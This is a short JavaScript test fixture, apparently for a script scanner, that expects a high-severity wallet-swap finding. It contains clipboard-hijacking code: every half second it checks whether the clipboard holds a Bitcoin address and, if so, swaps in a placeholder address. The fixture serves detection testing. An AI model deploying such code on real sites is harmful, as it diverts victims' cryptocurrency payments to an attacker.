// Synthetic test fixture: not functional malware. The address is a made-up pattern.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: wallet.swap=high
setInterval(function () {
  navigator.clipboard.readText().then(function (t) {
    if (new RegExp("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$").test(t)) {
      navigator.clipboard.writeText("bc1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq");
    }
  });
}, 500);
